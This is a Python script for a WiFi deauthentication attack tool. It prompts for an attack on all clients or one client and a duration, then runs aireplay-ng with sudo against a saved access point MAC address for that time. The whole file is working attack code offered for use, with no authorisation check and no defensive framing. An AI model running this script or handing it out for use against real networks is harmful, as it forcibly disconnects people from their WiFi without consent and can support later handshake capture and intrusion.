#!/usr/bin/env python3
import subprocess
import time
import threading
import os
from termcolor import colored
from functions import (
    get_saved_interface_info, get_saved_network_info, check_and_convert_cap_files
)

def deauth_attack(interface, ap, target=None, duration=10):
    
    """
    Perform a deauthentication attack on a target access point or client
    
    Args:
        interface: Wireless interface in monitor mode
        ap: MAC address of the target access point
        target: MAC address of the specific client (optional)
        duration: Duration of the attack in seconds
    """
    print(colored("[+] Starting deauthentication attack...", 'yellow'))
    try:
        if not interface or not ap:
            print(colored("[!] Interface and AP MAC address are required!", 'red'))
            return False
            
        try:
            result = subprocess.run(["ifconfig", interface], capture_output=True, text=True)
            if result.returncode != 0:
                print(colored(f"[!] Interface {interface} does not exist!", 'red'))
                return False
        except Exception:
            print(colored(f"[!] Cannot verify if interface {interface} exists. Continuing anyway...", 'yellow'))
            
        print(colored(f"\n[+] Starting deauth attack for {duration} seconds on:", 'yellow'))
        print(colored(" Access Point:","cyan"),ap)
        if target:
            print(colored("Target Client:", "cyan"), target)
        else:
            print(colored(" Target:", "cyan")+ " All connected clients")
        print(colored(" Interface:","cyan"), interface)
        
        cmd = ["sudo", "aireplay-ng", "--ignore-negative-one", "--deauth", "0", "-a", ap]
        
        if target:
            cmd.extend(["-c", target])
            
        cmd.append(interface)
        
        print(colored(f"\n[+] Executing: {' '.join(cmd)}", 'yellow'))
        print(colored(f"[+] Attack will run for {duration} seconds...", 'yellow'))
        print(colored(f"[+] Displaying aireplay-ng output in real-time...", 'yellow'))
        print(colored("-" * 60, 'blue'))
        
        subprocess.run(["sudo", "-v"])
        
        process = subprocess.Popen(cmd)
        
        def kill_after_duration():
            time.sleep(duration)
            if process.poll() is None:  
                print(colored("\n[+] Time's up! Stopping attack...", 'yellow'))
                process.terminate()
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    process.kill()
        
        timer = threading.Thread(target=kill_after_duration)
        timer.daemon = True  
        timer.start()
        
        try:
            process.wait()
        except KeyboardInterrupt:
            print(colored("\n[+] Deauthentication attack stopped by user.", 'yellow'))
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
                
    except Exception as e:
        print(colored(f"\n[!] Error during attack: {e}", 'red'))
        return False
        
    finally:
        print(colored("\n[+] Attack finished.", 'green'))

    return True 


def main():
    """Main function to handle user input and execute the attack"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(colored("\n=== WiFi Deauthentication Attack Tool ===", 'blue'))
    print(colored("This tool sends deauthentication packets to disconnect clients from a WiFi network\n", 'white'))
    
    interface_info = get_saved_interface_info()
    interface = interface_info[0] if isinstance(interface_info, tuple) else interface_info

    network_info = get_saved_network_info()
    ap = network_info[0] if isinstance(network_info, tuple) else network_info
    
    target_choice = input(colored("Deauthenticate (1) all clients or (2) specific client? [1/2]: ", 'cyan'))
    target = None
    if target_choice == "2":
        target = input(colored("Enter target client MAC address: ", 'cyan'))
    
    duration_input = input(colored("Enter attack duration in seconds [10]: ", 'cyan'))
    try:
        duration = int(duration_input) if duration_input.strip() else 10
    except ValueError:
        print(colored("[!] Invalid duration. Using default (10 seconds).", 'yellow'))
        duration = 10
    
    deauth_attack(interface, ap, target, duration)
    
    again = input(colored("\nRun another attack? [y/N]: ", 'cyan')).strip().lower()
    if again == 'y':
        main()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n\n[!] Program terminated by user.", 'yellow'))
    except Exception as e:
        print(colored(f"\n[!] An unexpected error occurred: {e}", 'red'))
    finally:
        print(colored("\nGoodbye!", 'green'))